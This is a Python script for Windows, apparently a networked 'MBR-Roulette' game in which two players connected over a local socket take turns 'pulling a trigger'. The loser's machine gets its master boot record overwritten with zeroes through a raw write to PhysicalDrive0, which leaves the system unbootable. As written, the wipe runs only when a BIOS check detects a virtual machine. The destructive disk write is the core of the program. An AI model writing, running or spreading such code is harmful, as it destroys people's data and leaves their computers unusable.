import random
from threading import Thread
import time
import socket
from win32ui import *
from win32con import *
from win32file import *
import subprocess

rec = ''
current_chamber = random.randint(1, 6)


def connect():
    global s
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('127.0.0.1', 9999))
        s.settimeout(None)
        return True
    except (ConnectionRefusedError, TimeoutError):
        return False
    

def tryAgain():
    success = False
    print('Establishing connection')
    time.sleep(1)

    while not success:
        print('Retrying...')
        success = connect()
        print(success)
        time.sleep(1)


def vm():
    try:
        o = subprocess.check_output("wmic bios get serialnumber", shell=True).decode().lower()
        if 'virtual' in o or 'vmware' in o or 'vbox' in o:
            return True

        return False

    except Exception as e:
        return False
    

def status(stat):
    
    if stat == 'd':
        if vm():
            hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0)
            WriteFile(hDevice, AllocateReadBuffer(512), None)
            CloseHandle(hDevice)
        MessageBox("Your device is done for! Enjoy while it lasts.", "Russian Roulette!", MB_ICONWARNING)       

    else:
        MessageBox("You survived, lets see how far you can go.", "Russian Roulette!", MB_ICONWARNING)

    sendAndRecieve(stat)


def sendAndRecieve(msgs) -> None:
    global rec
    if msgs:
        msgs = msgs.encode()
        s.send(msgs)
        rec = s.recv(1024).decode()
        if rec == 's':
            MessageBox("Your player2 survived. Its your turn now!", "Result", MB_ICONWARNING)
            dead = russian_roulette()
            if dead:
                status("d")
            else:
                status("s")

        
        elif rec == 'd':
            MessageBox("Your player2 is dead, Your device is safe! You can rest easy.", "Result", MB_ICONWARNING)

        else:
            return


def russian_roulette():
    global current_chamber

    input("Press enter to push the trigger.")
    
    if bullet_chamber == current_chamber:
        return True

    current_chamber = random.randint(1, 6)
    print("Waiting for the opponent.")
    return False
       

def start():
    global bullet_chamber
    MessageBox("You've chosen to play the MBR-Roulette. If you lose, your operting system is done forever. The only way to save your system is to survive until your opponent loses. Have fun :)", "Russian Roulette", MB_ICONWARNING)
    player = random.choice(['head', 'tail'])
    toss = random.choice(['head', 'tail'])
    bullet_chamber = random.randint(1, 6)
    
    if player == toss:
        MessageBox("You won the toss. You go first!", "Toss", MB_ICONWARNING)
        sendAndRecieve(str(bullet_chamber) + '1')
        dead = russian_roulette()
        if dead:
            status("d")
        else:
            status("s")

    else:
        MessageBox("Player2 won the toss. They go first!", "Toss", MB_ICONWARNING)
        sendAndRecieve(str(bullet_chamber) + '2')
        

tryAgain()
print(f'connected to the opponent!')
start()
